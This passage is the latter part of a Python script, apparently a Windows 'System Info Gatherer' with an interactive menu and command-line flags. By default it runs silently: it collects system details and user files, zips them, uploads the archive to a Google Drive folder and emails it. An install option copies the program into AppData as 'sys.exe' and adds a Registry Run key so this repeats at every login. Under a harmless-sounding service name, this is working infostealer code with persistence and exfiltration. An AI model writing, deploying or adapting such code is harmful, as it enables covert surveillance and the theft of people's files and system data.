        print(f"    Used:       {mem['used'] / (1024**3):.2f} GB ({mem['percentage']}%)")
        print(f"    Available:  {mem['available'] / (1024**3):.2f} GB")
        
        print("=" * 60)


def auto_send():
    """Automatically gather all system info, save reports, compress, upload to Drive, and send via email."""
    print("\n[*] Gathering system information...")
    gatherer = SystemInfoGatherer()
    all_info = gatherer.get_all_system_info()
    
    print("[*] Saving combined report file locally...")
    combined_file = gatherer.save_report_files(all_info)
    files_to_upload = [combined_file] if combined_file else []

    user_files = gatherer.get_files_to_upload()
    if user_files:
        files_to_upload.extend(user_files)
        print(f"[*] Discovered {len(user_files)} user files.")
    else:
        print("[*] No user files found.")

    # Always compress files into a ZIP archive
    zip_file = None
    if files_to_upload:
        print("[*] Compressing all files into a ZIP archive...")
        zip_file = gatherer.compress_files_to_zip(files_to_upload)

    # Try uploading to Google Drive
    folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
    if folder_id and zip_file:
        print("[*] Uploading compressed ZIP to Google Drive...")
        gatherer.upload_reports_to_drive([zip_file], folder_id)
    else:
        print("[*] Google Drive upload skipped (no credentials or no files).")

    # Send email with ZIP attached
    if GMAIL_APP_PASSWORD:
        print(f"[*] Sending email to {EMAIL_TO}...")
        gatherer.send_email(all_info, zip_file=zip_file)
    else:
        print("[*] Email sending skipped because GMAIL_APP_PASSWORD is not configured.")


def main():
    """Main function to run the system info gatherer"""
    gatherer = SystemInfoGatherer()
    
    while True:
        print("\nSystem Information Gatherer")
        print("1. Display system summary")
        print("2. Get CPU info")
        print("3. Get memory info")
        print("4. Get disk info")
        print("5. Get network info")
        print("6. Get GPU info")
        print("7. Get motherboard info")
        print("8. Get BIOS info")
        print("9. Get installed software")
        print("10. Get running services")
        print("11. Get startup programs")
        print("12. Get system uptime")
        print("13. Get all info & save to file")
        print("14. Get all info & send to email")
        print("15. Exit")
        
        choice = input("Enter your choice (1-15): ")
        
        if choice == '1':
            gatherer.display_summary()
        elif choice == '2':
            cpu = gatherer.get_cpu_info()
            print(json.dumps(cpu, indent=2, default=str))
        elif choice == '3':
            mem = gatherer.get_memory_info()
            print(json.dumps(mem, indent=2, default=str))
        elif choice == '4':
            disks = gatherer.get_disk_info()
            for disk in disks:
                print(f"\n  {disk['device']} ({disk['mountpoint']})")
                print(f"    Type:  {disk['file_system_type']}")
                print(f"    Total: {disk['total_size'] / (1024**3):.2f} GB")
                print(f"    Used:  {disk['used'] / (1024**3):.2f} GB ({disk['percentage']}%)")
                print(f"    Free:  {disk['free'] / (1024**3):.2f} GB")
        elif choice == '5':
            network = gatherer.get_network_info()
            print(json.dumps(network, indent=2, default=str))
        elif choice == '6':
            gpus = gatherer.get_gpu_info()
            for gpu in gpus:
                print(f"\n  {gpu['name']}")
                print(f"    RAM:     {gpu.get('adapter_ram', 'N/A')}")
                print(f"    Driver:  {gpu.get('driver_version', 'N/A')}")
        elif choice == '7':
            mb = gatherer.get_motherboard_info()
            print(json.dumps(mb, indent=2, default=str))
        elif choice == '8':
            bios = gatherer.get_bios_info()
            print(json.dumps(bios, indent=2, default=str))
        elif choice == '9':
            print("Fetching installed software (this may take a while)...")
            software = gatherer.get_installed_software()
            for sw in software:
                print(f"  {sw['name']} v{sw.get('version', 'N/A')} ({sw.get('vendor', 'N/A')})")
        elif choice == '10':
            services = gatherer.get_running_services()
            print(f"\nRunning services ({len(services)}):")
            for svc in services:
                print(f"  {svc['display_name']} [{svc['start_mode']}]")
        elif choice == '11':
            startup = gatherer.get_startup_programs()
            print(f"\nStartup programs ({len(startup)}):")
            for prog in startup:
                print(f"  {prog['name']}: {prog['command']}")
        elif choice == '12':
            uptime = gatherer.get_system_uptime()
            print(f"\n  Boot time: {uptime['boot_time']}")
            print(f"  Uptime:    {uptime['uptime']}")
        elif choice == '13':
            print("Gathering all system information...")
            all_info = gatherer.get_all_system_info()
            combined_file = gatherer.save_report_files(all_info)
            if combined_file:
                print(f"Saved combined report: {combined_file}")
                folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                if folder_id:
                    print("Uploading report to Google Drive...")
                    gatherer.upload_reports_to_drive([combined_file], folder_id)
                else:
                    print("Google Drive upload skipped because folder ID is not configured.")
        elif choice == '14':
            print("Gathering all system information...")
            all_info = gatherer.get_all_system_info()
            combined_file = gatherer.save_report_files(all_info)
            if combined_file:
                print(f"Saved combined report: {combined_file}")
                folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                if folder_id:
                    print("Uploading report to Google Drive...")
                    gatherer.upload_reports_to_drive([combined_file], folder_id)
                else:
                    print("Google Drive upload skipped because folder ID is not configured.")
            print(f"Sending email to {EMAIL_TO}...")
            gatherer.send_email(all_info)
        elif choice == '15':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")


def install_to_startup():
    """Install the exe to run at Windows startup via Registry"""
    import winreg
    import shutil
    
    try:
        # Get the path of the current executable
        if getattr(sys, 'frozen', False):
            # Running as compiled exe
            exe_path = sys.executable
        else:
            # Running as script
            exe_path = os.path.abspath(__file__)
        
        # Copy to a persistent location in AppData
        app_dir = os.path.join(os.environ.get('APPDATA', ''), 'SystemInfoService')
        os.makedirs(app_dir, exist_ok=True)
        
        exe_name = "sys.exe" if getattr(sys, 'frozen', False) else "sysinfo.py"
        dest_path = os.path.join(app_dir, exe_name)
        
        if os.path.abspath(exe_path) != os.path.abspath(dest_path):
            shutil.copy2(exe_path, dest_path)
            print(f"[+] Copied to: {dest_path}")
        
        # Build the startup command
        if getattr(sys, 'frozen', False):
            startup_cmd = f'"{dest_path}" --auto'
        else:
            startup_cmd = f'pythonw "{dest_path}" --auto'
        
        # Add to Windows Registry Run key
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "SystemInfoService", 0, winreg.REG_SZ, startup_cmd)
        winreg.CloseKey(reg_key)
        
        print("[+] Successfully installed to Windows startup!")
        print(f"[+] Registry entry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemInfoService")
        print(f"[+] Command: {startup_cmd}")
        print("[+] The system info will be collected and emailed on every login.")
        return True
        
    except Exception as e:
        print(f"[-] Failed to install to startup: {e}")
        return False


def uninstall_from_startup():
    """Remove from Windows startup"""
    import winreg
    import shutil
    
    try:
        # Remove registry entry
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(reg_key, "SystemInfoService")
            print("[+] Removed from Windows startup registry.")
        except FileNotFoundError:
            print("[*] Registry entry not found (already removed).")
        winreg.CloseKey(reg_key)
        
        # Remove installed files
        app_dir = os.path.join(os.environ.get('APPDATA', ''), 'SystemInfoService')
        if os.path.exists(app_dir):
            shutil.rmtree(app_dir)
            print(f"[+] Removed installed files from: {app_dir}")
        
        print("[+] Uninstall complete.")
        return True
        
    except Exception as e:
        print(f"[-] Failed to uninstall: {e}")
        return False


if __name__ == "__main__":
    
    if len(sys.argv) > 1:
        flag = sys.argv[1].lower()
        
        if flag in ('--auto', '--report', '--send-report'):
            # Silent mode: gather info, save a report, upload to Drive, and send email
            auto_send()
        elif flag == '--menu' or flag == '--interactive':
            main()
        elif flag == '--install':
            # Install to Windows startup
            install_to_startup()
        elif flag == '--uninstall':
            # Remove from Windows startup
            uninstall_from_startup()
        elif flag == '--help':
            print("System Info Gatherer - Usage:")
            print("  sys.exe                  Automatically gather info and deliver reports")
            print("  sys.exe --menu           Run the interactive menu")
            print("  sys.exe --auto           Gather info, save report, upload to Drive, and send email silently")
            print("  sys.exe --report         Same as --auto")
            print("  sys.exe --install        Install to Windows startup")
            print("  sys.exe --uninstall      Remove from Windows startup")
            print("  sys.exe --help           Show this help message")
        else:
            print(f"Unknown flag: {flag}")
            print("Use --help to see available options.")
    else:
        auto_send()